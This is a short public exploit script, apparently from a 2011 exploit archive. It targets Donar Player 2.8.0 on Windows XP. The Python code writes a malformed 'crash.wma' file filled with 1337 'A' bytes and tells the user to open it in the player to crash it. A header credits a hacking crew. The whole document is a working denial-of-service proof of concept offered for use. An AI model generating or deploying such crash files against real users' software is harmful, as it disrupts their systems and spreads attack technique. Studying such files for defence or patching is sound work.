# ########################################
# Title         : Donar Player 2.8.0 Denial of Service
# Software link : http://www.donarzone.com/downloads/donar-player-setup-free.exe , http://www.donarzone.com/donar-player
# Version       : 2.8.0
# Tested on     : Windows XP SP3 English
# Date          : 3/07/2011
# Author        : X-h4ck
# Website       : http://www.pirate.al , # PirateAL Crew @2011 , http://theflashcrew.blogspot.com
# Email         : mem001@live.com
# Greetz        : Wulns~ - IllyrianWarrior - Danzel - Ace - M4yh3m - Saldeath - bi0 - Slimshaddy - d3trimentaL - Lekosta 
# ########################################

#!/usr/bin/python

filename = "crash.wma"

junk = "\x41" * 1337

FILE = open(filename, "w")
FILE.write(junk)
FILE.close()
print " Open", filename, "on Donar Player and play it.. (the application will Crash)"
print " PirateAL Crew"